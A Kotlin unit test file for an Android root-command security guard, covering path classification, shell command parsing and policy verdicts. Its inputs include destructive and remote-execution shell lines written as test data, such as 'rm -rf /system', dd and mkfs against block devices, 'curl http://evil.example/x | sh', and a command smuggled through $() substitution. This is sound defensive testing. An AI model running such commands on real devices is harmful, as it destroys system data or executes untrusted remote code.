// Copyright 2026, shso contributors
// SPDX-License-Identifier: Apache-2.0

package com.mixradio.droid.data.security

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

/**
 * JVM 单元测试覆盖安全核心纯逻辑（不依赖 Android Context/ROOT），用于在无 ROOT 真机环境下
 * 替代 ROOT 链路清单 #7-10 项的真机拦截验证：解析、路径分级、策略判定。
 *
 * 配套补救：docs/安全改造任务清单.md 「ROOT 链路 / 拦截逻辑」区域说明。
 */
class SecurityCoreTest {

    // ============================================================================
    // GuardPathPolicy: deterministic Root PATH policy
    // ============================================================================

    @Test fun `guard path is empty below standard`() {
        assertEquals("", GuardPathPolicy.prefixOrNull(SecurityLevels.AUDIT_ONLY, guardReady = false))
    }

    @Test fun `guard path is unavailable at standard when guard is not ready`() {
        assertNull(GuardPathPolicy.prefixOrNull(SecurityLevels.STANDARD, guardReady = false))
        assertNull(GuardPathPolicy.prefixOrNull(SecurityLevels.MAXIMUM, guardReady = false))
    }

    @Test fun `guard path uses only guard and fixed trusted system directories`() {
        val prefix = GuardPathPolicy.prefixOrNull(SecurityLevels.STANDARD, guardReady = true)

        assertEquals(
            "export PATH=/data/adb/modules/shso_guard/guard:/sbin:/system/sbin:/system/bin:/system/xbin && ",
            prefix
        )
        assertFalse(prefix!!.contains("\$PATH"))
    }

    // ============================================================================
    // GuardModuleInstaller: archive safety
    // ============================================================================

    @Test fun `archive entry validation rejects escaping and malformed names`() {
        val staging = File("build/test-guard-staging").canonicalFile
        assertNotNull(GuardModuleInstaller.validateArchiveEntry(staging, "guard/rm"))
        for (name in listOf("/module.prop", "../outside", "guard/../../outside", "guard\\rm", "", "guard//rm", "guard/./rm")) {
            assertNull("expected rejection for $name", GuardModuleInstaller.validateArchiveEntry(staging, name))
        }
    }

    @Test fun `archive contract requires entries present in shso guard asset`() {
        // 含 v1.1.0 新增的覆盖面：多二进制派发（toybox/busybox）+ 高频破坏原语（mv/cp/find/sed）
        val names = listOf(
            "module.prop", "policy.conf", "guard/common.sh", "guard/rm", "guard/rmdir",
            "guard/wipe", "guard/dd", "guard/fastboot", "guard/truncate", "guard/shred",
            "guard/make_f2fs", "guard/mke2fs", "guard/mkfs.ext4", "guard/mkfs.f2fs", "guard/mkfs.vfat",
            "guard/toybox", "guard/busybox", "guard/mv", "guard/cp", "guard/find", "guard/sed"
        )
        assertTrue(GuardModuleInstaller.hasRequiredArchiveEntries(names))
        assertFalse(GuardModuleInstaller.hasRequiredArchiveEntries(names - "guard/mkfs.vfat"))
        // 新增包装器同属必需项：缺任何一个都必须拒绝安装，否则用户会静默拿到残缺守卫
        assertFalse(GuardModuleInstaller.hasRequiredArchiveEntries(names - "guard/toybox"))
        assertFalse(GuardModuleInstaller.hasRequiredArchiveEntries(names - "guard/mv"))
    }

    // ============================================================================
    // SecurityAuditLog: bounded tail input
    // ============================================================================

    @Test fun `tail line limit is always positive and finite`() {
        assertEquals(1, SecurityAuditLog.boundedTailLines(0))
        assertEquals(1, SecurityAuditLog.boundedTailLines(-100))
        assertEquals(SecurityAuditLog.MAX_TAIL_LINES, SecurityAuditLog.boundedTailLines(Int.MAX_VALUE))
    }

    // ============================================================================
    // RootCommandGateway: fail closed on policy exceptions
    // ============================================================================

    @Test fun `interactive hard rule policy exception blocks critically`() {
        val verdict = RootCommandGateway.checkInteractiveHardRulesWith("echo test") { _, _ ->
            error("policy unavailable")
        }
        assertNotNull(verdict)
        assertTrue(verdict!!.findings.any { it.ruleId == "POLICY_ERROR" })
        assertEquals(RiskLevel.CRITICAL, verdict.findings.single().level)
    }

    // ============================================================================
    // SecurityModels
    // ============================================================================

    @Test fun `SecurityLevels nameOf covers all four tiers`() {
        assertEquals("0 无防护", SecurityLevels.nameOf(SecurityLevels.OFF))
        assertEquals("1 仅审计", SecurityLevels.nameOf(SecurityLevels.AUDIT_ONLY))
        assertEquals("2 标准防护", SecurityLevels.nameOf(SecurityLevels.STANDARD))
        assertEquals("3 最强防护", SecurityLevels.nameOf(SecurityLevels.MAXIMUM))
    }

    @Test fun `SecurityLevels nameOf unknown level falls back`() {
        assertTrue(SecurityLevels.nameOf(99).contains("99"))
        assertTrue(SecurityLevels.nameOf(-1).contains("-1"))
    }

    @Test fun `SecurityLevels isValid only accepts 0_3`() {
        assertTrue(SecurityLevels.isValid(0))
        assertTrue(SecurityLevels.isValid(3))
        assertFalse(SecurityLevels.isValid(4))
        assertFalse(SecurityLevels.isValid(-1))
    }

    @Test fun `RiskLevel maxOf picks higher ordinal`() {
        assertEquals(RiskLevel.CRITICAL, RiskLevel.SAFE.maxOf(RiskLevel.CRITICAL))
        assertEquals(RiskLevel.CRITICAL, RiskLevel.CRITICAL.maxOf(RiskLevel.WARNING))
        assertEquals(RiskLevel.DANGEROUS, RiskLevel.WARNING.maxOf(RiskLevel.DANGEROUS))
    }

    @Test fun `Verdict INTERNAL_APP short-circuits to Allow`() {
        // INTERNAL_APP: 直接放行（白名单）
        val v = PolicyEngine.evaluate("rm -rf /system", CommandSource.INTERNAL_APP)
        assertEquals(Verdict.Allow, v)
    }

    // ============================================================================
    // PathClassifier: 归一化
    // ============================================================================

    @Test fun `normalize drops trailing slash and folds double slashes`() {
        assertEquals("/etc", PathClassifier.normalize("/etc/"))
        assertEquals("/etc", PathClassifier.normalize("/etc//"))
        assertEquals("/etc", PathClassifier.normalize("///etc"))
    }

    @Test fun `normalize resolves single and chained dotdot`() {
        assertEquals("/data", PathClassifier.normalize("/system/../data"))
        assertEquals("/data", PathClassifier.normalize("/etc/var/../../data"))
        assertEquals("/", PathClassifier.normalize("/system/.."))
    }

    @Test fun `normalize strips quote residue`() {
        assertEquals("/etc", PathClassifier.normalize("\"/etc\""))
        assertEquals("/etc", PathClassifier.normalize("'/etc'"))
    }

    @Test fun `normalize truncates wildcard base path`() {
        assertEquals("/data/media", PathClassifier.normalize("/data/media/*.jpg"))
        assertEquals("/system", PathClassifier.normalize("/system/*"))
    }

    @Test fun `normalize preserves relative path`() {
        // 相对路径不被吞,留给分类判定为 WARNING
        assertEquals("foo/bar", PathClassifier.normalize("foo/bar"))
    }

    // ============================================================================
    // PathClassifier: 分级
    // ============================================================================

    @Test fun `classify root is CRITICAL`() {
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/"))
    }

    @Test fun `classify system partition is CRITICAL`() {
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/system"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/system/bin"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/vendor/etc"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/proc/1"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/sys/class"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/dev/block/sda1"))
    }

    @Test fun `classify data root is DANGEROUS but media subpath is SAFE`() {
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/data"))
        // /data/local 在 WARNING_PREFIXES 中,故为 WARNING(应用数据删了丢数据但不破坏系统)
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/local"))
        // /data/media 用户存储映射 → SAFE
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/data/media/0"))
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/data/media/0/DCIM"))
        // /data/adb/shso 应用工作区 → SAFE
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/data/adb/shso/audit.log"))
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/data/local/tmp/x"))
    }

    @Test fun `classify sdcard storage is SAFE`() {
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/sdcard/DCIM"))
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/storage/emulated/0"))
    }

    @Test fun `classify app data is WARNING`() {
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/app/com.foo"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/user/0"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/data/com.foo"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/dalvik-cache"))
    }

    @Test fun `classify metadata and persist are DANGEROUS`() {
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/metadata"))
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/persist/wifi"))
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/config"))
    }

    @Test fun `classify dotdot traversal exposes real partition class`() {
        // /system/../data → 归一化到 /data → DANGEROUS
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/system/../data"))
        // /etc/../system → 归一化到 /system → CRITICAL（重要防穿越）
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/etc/../system"))
    }

    @Test fun `classify wildcard bumps one level`() {
        // 不带通配符是 SAFE,带通配符必须至少提一级 → WARNING
        assertEquals(PathClassifier.PathClass.SAFE, PathClassifier.classify("/data/media"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/media/*"))
        // CRITICAL 已达上限,通配符仍是 CRITICAL
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/system"))
        assertEquals(PathClassifier.PathClass.CRITICAL, PathClassifier.classify("/system/*"))
        // ? 单字符通配同样触发提级
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/media/?"))
        // WARNING 基路径 → DANGEROUS
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("/data/local"))
        assertEquals(PathClassifier.PathClass.DANGEROUS, PathClassifier.classify("/data/local/*"))
    }

    @Test fun `classify relative path or empty falls to WARNING`() {
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify(""))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("foo/bar"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("~/"))
    }

    @Test fun `classify variable expression falls to WARNING`() {
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("\$HOME/x"))
        assertEquals(PathClassifier.PathClass.WARNING, PathClassifier.classify("\${HOME}/x"))
    }

    // ============================================================================
    // CommandParser: 基本切分 + 前缀剥离
    // ============================================================================

    @Test fun `parse simple command produces single atom`() {
        val r = CommandParser.parse("ls -la /sdcard")
        assertFalse(r.truncated)
        assertEquals(1, r.atoms.size)
        val a = r.atoms.single()
        assertEquals("ls", a.program)
        assertTrue(a.operands.contains("/sdcard"))
    }

    @Test fun `parse strips busybox prefix`() {
        val r = CommandParser.parse("busybox rm -rf /tmp/foo")
        assertEquals("rm", r.atoms.single().program)
    }

    @Test fun `parse strips toybox prefix`() {
        val r = CommandParser.parse("/system/bin/toybox rm /tmp/foo")
        assertEquals("rm", r.atoms.single().program)
    }

    @Test fun `parse strips env prefix`() {
        // env PATH=x rm ...  → 实际命令是 rm,env 只传递环境变量
        val r = CommandParser.parse("env PATH=/x rm /tmp/foo")
        assertEquals("rm", r.atoms.single().program)
    }

    @Test fun `parse strips env with multiple VAR=value args`() {
        // env VAR1=x VAR2=y rm /tmp/foo
        val r = CommandParser.parse("env A=1 B=2 C=3 rm /tmp/foo")
        assertEquals("rm", r.atoms.single().program)
        assertTrue(r.atoms.single().operands.contains("/tmp/foo"))
    }

    @Test fun `parse strips nohup prefix`() {
        val r = CommandParser.parse("nohup rm /tmp/foo")
        assertEquals("rm", r.atoms.single().program)
    }

    @Test fun `parse splits pipes into segments with adjacent ids`() {
        // curl http://x | sh  →  两原子,segmentId 相邻
        val r = CommandParser.parse("curl http://x | sh")
        assertEquals(2, r.atoms.size)
        assertEquals("curl", r.atoms[0].program)
        assertEquals("sh", r.atoms[1].program)
        assertEquals(r.atoms[0].segmentId + 1, r.atoms[1].segmentId)
    }

    @Test fun `parse splits semicolon and and`() {
        val r = CommandParser.parse("ls /a; rm /b && echo done")
        assertEquals(3, r.atoms.size)
        assertEquals("ls", r.atoms[0].program)
        assertEquals("rm", r.atoms[1].program)
        assertEquals("echo", r.atoms[2].program)
    }

    // ============================================================================
    // CommandParser: 命令替换递归
    // ============================================================================

    @Test fun `parse recursively expands dollar paren`() {
        // echo $(rm -rf /system) → 内层 rm 先,外层 echo 后(nested=true 标记内层)
        val r = CommandParser.parse("echo \$(rm -rf /system)")
        assertFalse(r.truncated)
        assertEquals(2, r.atoms.size)
        assertEquals("rm", r.atoms[0].program)
        assertEquals("echo", r.atoms[1].program)
        assertTrue(r.atoms[0].nested)
    }

    @Test fun `parse expands backtick substitution`() {
        // echo `rm -rf /system` → 内层 rm 先,外层 echo 后
        val r = CommandParser.parse("echo `rm -rf /system`")
        assertEquals(2, r.atoms.size)
        assertEquals("rm", r.atoms[0].program)
        assertEquals("echo", r.atoms[1].program)
    }

    @Test fun `parse recursively expands nested dollar paren`() {
        // echo $(busybox rm /system) → 至少 2 原子,内层 rm
        val r = CommandParser.parse("echo \$(busybox rm /system)")
        assertFalse(r.truncated)
        assertTrue(r.atoms.any { it.program == "rm" && it.nested })
    }

    @Test fun `parse respects quoted literal without expanding`() {
        // 引号内不应展开命令替换
        val r = CommandParser.parse("echo '\$(rm /system)'")
        assertEquals(1, r.atoms.size)
        assertEquals("echo", r.atoms.single().program)
    }

    // ============================================================================
    // CommandParser: 溢出保护（fail-closed）
    // ============================================================================

    @Test fun `parse overflow flagged as truncated for massive atomic count`() {
        // 构造超大原子数: 用 ; 串足够多的 ls
        val big = (1..200).joinToString("; ") { "ls /a$it" }
        val r = CommandParser.parse(big)
        assertTrue("expected truncated=true for huge input, got atoms=${r.atoms.size}", r.truncated)
    }

    // ============================================================================
    // PolicyEngine: 黑名单硬拦截
    // ============================================================================

    @Test fun `terminal rm rf system is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("rm -rf /system", CommandSource.USER_TERMINAL)
        assertTrue("expected Block, got $v", v is Verdict.Block)
        val block = v as Verdict.Block
        assertTrue(block.findings.any { it.ruleId == "RM_SYSTEM" })
        assertEquals(RiskLevel.CRITICAL, block.findings.first { it.ruleId == "RM_SYSTEM" }.level)
    }

    @Test fun `terminal rm rf sys  dotdot traversal is BLOCK`() {
        // rm -rf /system/../data  归一化后落到 /data（DANGEROUS）会 Confirm
        // 但本案例走 /system/../system 等价于 /system 仍为 CRITICAL
        val v = PolicyEngine.evaluate("rm -rf /system/../system", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "RM_SYSTEM" })
    }

    @Test fun `terminal rm of vendor is BLOCK`() {
        val v = PolicyEngine.evaluate("rm -rf /vendor", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
    }

    @Test fun `terminal rm of data partition is CONFIRM WARNING`() {
        // /data/local 在 WARNING_PREFIXES;rm -rf 命中 evaluateRm 中 WARNING 分支 → Confirm(WARNING)
        val v = PolicyEngine.evaluate("rm -rf /data/local/foo", CommandSource.USER_TERMINAL)
        assertTrue("expected Confirm, got $v", v is Verdict.Confirm)
        val c = v as Verdict.Confirm
        assertTrue(c.findings.any { it.ruleId == "RM_APPDATA" })
        assertEquals(RiskLevel.WARNING, c.level)
    }

    @Test fun `terminal rm of adb modules area is CONFIRM DANGEROUS`() {
        // /data/adb 在 DANGEROUS 区域（非 /data/adb/shso 的应用工作区,例如 /data/adb/backup）
        val v = PolicyEngine.evaluate("rm -rf /data/adb/backup", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Confirm)
        val c = v as Verdict.Confirm
        assertTrue(c.findings.any { it.ruleId == "RM_DATA" })
        assertEquals(RiskLevel.DANGEROUS, c.level)
    }

    @Test fun `terminal dd to block device is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("dd if=/dev/zero of=/dev/block/sda", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "DD_BLOCK_DEV" })
    }

    @Test fun `terminal mkfs is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("mkfs.ext4 /dev/block/mmcblk0p1", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "MKFS" })
    }

    @Test fun `terminal wipe is BLOCK CRITICAL`() {
        // wipe 修复后(RM_LIKE 移除 wipe),PolicyEngine 第 88 行 wipe 分支无条件加 WIPE CRITICAL
        val v = PolicyEngine.evaluate("wipe /data", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "WIPE" })
    }

    @Test fun `terminal fastboot erase is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("fastboot erase userdata", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "FASTBOOT_ERASE" })
    }

    @Test fun `terminal chmod 777 system is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("chmod -R 777 /system", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "CHMOD_SYSTEM" })
    }

    @Test fun `terminal find delete system is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("find /system -name x -delete", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "FIND_DELETE" })
    }

    @Test fun `terminal find exec rm system is BLOCK CRITICAL`() {
        val v = PolicyEngine.evaluate("find /system -exec rm {} +", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "FIND_DELETE" })
    }

    // ============================================================================
    // PolicyEngine: 管道执行检测
    // ============================================================================

    @Test fun `terminal curl pipe to sh is CONFIRM DANGEROUS`() {
        val v = PolicyEngine.evaluate("curl http://evil.example/x | sh", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Confirm)
        assertTrue((v as Verdict.Confirm).findings.any { it.ruleId == "REMOTE_PIPE_SHELL" })
    }

    @Test fun `terminal wget pipe to bash is CONFIRM DANGEROUS`() {
        val v = PolicyEngine.evaluate("wget -qO- http://x | bash", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Confirm)
        assertTrue((v as Verdict.Confirm).findings.any { it.ruleId == "REMOTE_PIPE_SHELL" })
    }

    @Test fun `terminal base64 pipe to sh is CONFIRM DANGEROUS`() {
        val v = PolicyEngine.evaluate("echo aGVsbG8= | base64 -d | sh", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Confirm)
        assertTrue((v as Verdict.Confirm).findings.any { it.ruleId == "ENCODED_PIPE_SHELL" })
    }

    // ============================================================================
    // PolicyEngine: 前缀剥离 + 递归展开
    // ============================================================================

    @Test fun `terminal busybox rm rf system is BLOCK after prefix strip`() {
        val v = PolicyEngine.evaluate("busybox rm -rf /system", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "RM_SYSTEM" })
    }

    @Test fun `terminal toybox rm rf system is BLOCK after prefix strip`() {
        val v = PolicyEngine.evaluate("/system/bin/toybox rm -rf /system", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "RM_SYSTEM" })
    }

    @Test fun `terminal echo dollar-paren rm rf data is CONFIRM via nested expansion`() {
        // echo $(rm -rf /data/local/foo) → 内层 rm -rf 走 evaluateRm,目标 /data/local 命中 WARNING_PREFIXES → Confirm(WARNING)
        val v = PolicyEngine.evaluate("echo \$(rm -rf /data/local/foo)", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Confirm)
        assertTrue((v as Verdict.Confirm).findings.any { it.ruleId == "RM_APPDATA" })
    }

    @Test fun `terminal echo dollar-paren rm rf system is BLOCK via nested expansion`() {
        val v = PolicyEngine.evaluate("echo \$(rm -rf /system)", CommandSource.USER_TERMINAL)
        assertTrue(v is Verdict.Block)
        assertTrue((v as Verdict.Block).findings.any { it.ruleId == "RM_SYSTEM" })
    }

    // ============================================================================
    // PolicyEngine: 溢出保护 fail-closed
    // ============================================================================

    @Test fun `parse overflow bubbles up as Confirm CRITICAL`() {
        // 极长链式 ; 触发 truncated; 策略层把 truncated 视为 Confirm(CRITICAL),非 Block
        val big = (1..200).joinToString("; ") { "ls /a$it" }
        val v = PolicyEngine.evaluate(big, CommandSource.USER_TERMINAL)
        assertTrue("expected Confirm for overflow, got $v", v is Verdict.Confirm)
        assertEquals(RiskLevel.CRITICAL, (v as Verdict.Confirm).level)
        assertTrue(v.findings.any { it.ruleId == "PARSER_OVERFLOW" })
    }

    // ============================================================================
    // PolicyEngine: 安全白名单（不拦截）
    // ============================================================================

    @Test fun `terminal ls sdcard is Allow`() {
        val v = PolicyEngine.evaluate("ls -la /sdcard", CommandSource.USER_TERMINAL)
        assertEquals(Verdict.Allow, v)
    }

    @Test fun `terminal cat sdcard file is Allow`() {
        val v = PolicyEngine.evaluate("cat /sdcard/Download/x.txt", CommandSource.USER_TERMINAL)
        assertEquals(Verdict.Allow, v)
    }

    @Test fun `terminal dd to dev null is Allow`() {
        val v = PolicyEngine.evaluate("dd if=/sdcard/a of=/dev/null", CommandSource.USER_TERMINAL)
        assertEquals(Verdict.Allow, v)
    }
}
